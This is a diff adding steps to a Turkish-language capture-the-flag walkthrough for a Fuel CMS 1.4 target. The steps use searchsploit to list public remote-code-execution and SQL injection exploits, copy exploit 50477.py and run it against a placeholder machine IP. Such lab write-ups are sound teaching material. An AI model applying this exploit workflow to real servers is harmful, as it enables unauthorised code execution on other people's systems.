@@ -94,6 +94,31 @@ Websitesini ilk ziyaret ettiğimizde gördüğümüz kullanıcı adı parolayı 
 
 Sonrasında searchsploit kullanarak bir arama yapıyoruz cms versiyonu hakkında.
 
+```bash
+searchsploit Fuel CMS 1.4
+```
+```bash
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                     | linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                     | php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                     | php/webapps/50477.py
+Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                    | php/webapps/50523.txt
+Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                           | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                               | php/webapps/48778.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+Ve bir RCE zaafiyeti olduğunu görüyoruz sonrasında bu py dosyasını localimize almak için -m parametresini kullanıyoruz
 
+```bash
+searhcsploit -m 50477.py
+```
+Sonrasında python dosyamızı çalıştırıyoruz
+
+```bash
+python3 50477.py -u http://<your_machine_ip>/
+```
 
 
